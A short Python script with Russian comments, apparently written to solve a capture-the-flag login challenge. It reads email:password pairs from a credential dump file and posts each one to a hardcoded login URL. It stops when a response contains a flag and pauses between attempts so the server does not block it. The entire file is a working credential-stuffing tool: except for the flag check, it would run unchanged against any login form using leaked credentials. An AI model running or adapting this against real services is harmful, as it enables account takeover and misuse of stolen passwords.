import requests
import time

# URL сайта задачи (замените на актуальный из браузера)
TARGET_URL = "http://63.176.166.122/"
DUMP_FILE = "dump.txt"


def check_users():
    try:
        with open(DUMP_FILE, 'r') as f:
            lines = f.readlines()

        print(f"Загружено {len(lines)} строк. Начинаю проверку...")

        for line in lines:
            line = line.strip()
            if not line or ":" not in line:
                continue

            email, password = line.split(':', 1)

            # Данные для POST-запроса (проверьте 'name' в HTML коде формы)
            data = {
                'email': email,
                'password': password
            }

            try:
                # Отправляем запрос
                start_time = time.time()
                response = requests.post(TARGET_URL, data=data, timeout=10)
                duration = time.time() - start_time

                # Анализируем ответ
                # Если сервер отвечает медленно на НЕВЕРНЫЕ данные,
                # то быстрый ответ может означать успех.
                if "flag{" in response.text:
                    print(f"\n[!!!] НАЙДЕНО! Email: {email}, Pass: {password}")
                    print(f"Флаг: {response.text}")
                    return

                print(f"[-] {email}: Ошибка ({duration:.2f} сек)")

            except Exception as e:
                print(f"[!] Ошибка при запросе для {email}: {e}")

            # Задержка, чтобы сервер вас не заблокировал окончательно
            time.sleep(1)

    except FileNotFoundError:
        print("Файл dump.txt не найден!")


if __name__ == "__main__":
    check_users()